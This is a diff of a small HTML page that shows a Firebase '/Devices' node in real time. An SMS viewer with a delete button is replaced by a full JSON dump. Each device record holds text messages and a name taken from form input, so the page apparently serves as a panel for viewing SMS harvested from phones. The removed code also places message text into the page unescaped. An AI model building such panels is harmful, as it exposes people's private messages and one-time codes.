@@ -2,32 +2,24 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Realtime SMS Viewer</title>
+  <title>Devices Full JSON – Realtime View</title>
   <style>
     body {font-family: Arial, sans-serif; margin:40px;}
     h2 {margin-top:30px;}
-    .sms-card{
+    pre {
       background:#f7f7f7;
       padding:12px;
-      margin:8px 0;
       border:1px solid #ccc;
       border-radius:6px;
-    }
-    .delete-btn{
-      background:#d9534f;
-      color:#fff;
-      border:none;
-      padding:4px 10px;
-      border-radius:4px;
-      cursor:pointer;
+      overflow-x:auto;
     }
   </style>
 </head>
 <body>
-  <h1>Devices → SMS (Realtime)</h1>
+  <h1>Firebase /Devices (Full JSON)</h1>
   <div id="content">Loading…</div>
 
-  <!-- Firebase Libs -->
+  <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
   <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
@@ -54,48 +46,30 @@
         const deviceId = deviceSnap.key;
         const data = deviceSnap.val();
 
-        // Name priority (model > fullName > deviceId)
+        // title (Model > fullName > deviceId)
         let name = deviceId;
         if(data.DeviceInfo && data.DeviceInfo.model){
           name = data.DeviceInfo.model;
         }else if(data.input && data.input.fullName){
           name = data.input.fullName;
         }
+
+        // heading
         const h2 = document.createElement('h2');
         h2.innerText = name;
         container.appendChild(h2);
 
-        if(data.sms){
-          Object.entries(data.sms).forEach(([msgId, sms])=>{
-            const card = document.createElement('div');
-            card.className='sms-card';
-            card.innerHTML = `
-              <b>Sender:</b> ${sms.sender}<br/>
-              <b>Body:</b> ${sms.messageBody}<br/>
-              <b>Time:</b> ${sms.time}<br/>
-              <button class="delete-btn" onclick="deleteMsg('${deviceId}','${msgId}')">Delete</button>
-            `;
-            container.appendChild(card);
-          });
-        } else {
-          const p = document.createElement('p');
-          p.innerText = 'No SMS found.';
-          container.appendChild(p);
-        }
+        // full JSON text
+        const pre = document.createElement('pre');
+        pre.innerText = JSON.stringify(data, null, 2);
+        container.appendChild(pre);
       });
     }
 
-    // realtime updates
+    // Live updates
     db.ref('Devices').on('value', function(snapshot){
       render(snapshot);
     });
-
-    function deleteMsg(deviceId, msgId){
-      if(confirm("Delete this message?")){
-        db.ref(`Devices/${deviceId}/sms/${msgId}`).remove()
-          .catch(err=>alert("Error: "+err.message));
-      }
-    }
   </script>
 </body>
 </html>
